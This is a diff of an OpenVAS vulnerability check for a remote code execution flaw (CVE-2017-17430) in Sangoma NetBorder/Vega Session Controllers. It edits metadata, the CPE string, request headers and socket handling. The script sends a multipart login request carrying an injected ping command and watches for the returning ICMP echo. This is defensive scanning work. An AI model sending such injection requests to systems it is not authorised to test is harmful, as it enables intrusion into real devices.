@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sangoma_nsc_rce_vuln.nasl 8376 2018-01-11 14:29:07Z asteins $
+# $Id: gb_sangoma_nsc_rce_vuln.nasl 8531 2018-01-25 10:56:00Z asteins $
 #
 # Sangoma NetBorder/Vega Session Controller Remote Code Execution Vulnerability
 #
@@ -28,10 +28,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.112184");
-  script_version("$Revision: 8376 $");
+  script_version("$Revision: 8531 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-11 15:29:07 +0100 (Thu, 11 Jan 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-01-25 11:56:00 +0100 (Thu, 25 Jan 2018) $");
   script_tag(name:"creation_date", value:"2018-01-11 12:32:00 +0100 (Thu, 11 Jan 2018)");
 
   script_cve_id("CVE-2017-17430");
@@ -59,7 +59,7 @@ if(description)
   exit(0);
 }
 
-CPE = "cpe:/o:sangoma:netborder%2fvega_session_firmware";
+CPE = "cpe:/o:sangoma:netborder";
 
 include("http_func.inc");
 include("http_keepalive.inc");
@@ -81,20 +81,20 @@ post_data = '------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: fo
 						'------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name="Login"\r\n\r\nLogin\r\n' +
 						'------WebKitFormBoundary7rCkcn7Zm8a4V1bH--\r\n';
 
-headers = make_array( "Cookie", "PHPSESSID=871dc15caa56e15923333683c1fda6bf",
-                      "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7rCkcn7Zm8a4V1bH" );
+headers = make_array( "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7rCkcn7Zm8a4V1bH" );
 
 req = http_post_req( port:port, url:'/', data:post_data, add_headers:headers );
 
-res = send_capture( socket:soc, data:req, pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
+res = send_capture( socket:soc, data:req,
+                    pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host()," and src host ",
+                                         get_host_ip() ) );
+close( soc );
 data = get_icmp_element( icmp:res, element:"data" );
 
 if( data && check >< data ) {
-  close( soc );
   report = 'It was possible to execute the command "' + pingcmd + '" on the remote host.\r\n\r\nRequest:\r\n\r\n' + req + '\r\n\r\nResponse:\r\n\r\n' + data;
   security_message( port:port, data:report );
   exit( 0 );
 }
 
-close( soc );
-exit( 99 );
+exit( 0 );
